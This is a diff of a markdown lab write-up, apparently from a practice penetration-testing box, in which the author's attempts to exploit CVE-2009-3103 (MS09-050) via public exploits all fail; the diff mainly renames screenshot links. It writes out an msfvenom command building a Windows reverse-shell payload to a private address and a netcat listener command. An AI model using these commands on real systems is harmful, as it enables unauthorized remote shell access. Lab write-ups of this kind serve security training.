@@ -30,7 +30,7 @@ Then, the summary, I remembered that CVE-2009-3103 was mentioned, and I decided 
 
 After running it, it fails.
 
-![[Pasted image 20260228190155.png]]
+![](msf-ms09-050-socket-error.png)
 
 Time to try something different. Let's research `CVE-2009-3103` on exploit-db.
 
@@ -40,7 +40,7 @@ https://www.exploit-db.com/exploits/40280
 
 I save it to `./exploit40280.py`. 
 
-![[Pasted image 20260228191856.png]]
+![](exploit40280-vscode-edit.png)
 
 
 I intend to use msfvenom thusly to update the payload:
@@ -48,11 +48,11 @@ I intend to use msfvenom thusly to update the payload:
     msfvenom -p windows/shell_revese_tcp LHOST=192.168.45.214 LPORT=443 EXITFUNC=thread -f python -v shell
 
 
-![[Pasted image 20260228192105.png]]
+![](msfvenom-shell-reverse-tcp-payload.png)
 
 And started a listener with `rlwrap nc -lvnp 443`:
 
-![[Pasted image 20260228192246.png]]
+![](msf-ms09-050-nc-listener.png)
 
 Then, in another tab, I tried the exploit. 
 
@@ -60,7 +60,7 @@ I had to comment out the smb import.
 
 It also failed.
 
-![[Pasted image 20260228192806.png]]
+![](exploit40280-nt-status-logon-failure.png)
 
 I then found a Python3 version of the CVE-2009-3103 exploit on GitHub.
 
@@ -68,17 +68,19 @@ https://github.com/sec13b/ms09-050_CVE-2009-3103/blob/main/MS09_050_2.py?source=
 
 I edited it with the same msfvenom payload.
 
-![[Pasted image 20260228193337.png]]
+![](ms09-050-v2-msfvenom-payload.png)
 
 Then I ran it. It failed due to missing `smb` package, so I made a virtualenv.
 
-![[Pasted image 20260228193739.png]]
+![](venv-setup-smbclient-install.png)
 
 Now, we can finally run the exploit.'
 
 It fails! I'm not sure why. I followed this medium guide pretty closely. I am going to chalk this up to code rot.
 
-![[Pasted image 20260228193903.png]]
+https://medium.com/@ayxantanirverdiyev6/pg-practice-internal-walkthrough-49bca402f737
+
+![](ms09-050-v2-nt-status-logon-failure.png)
 
 ## Recommendations
 
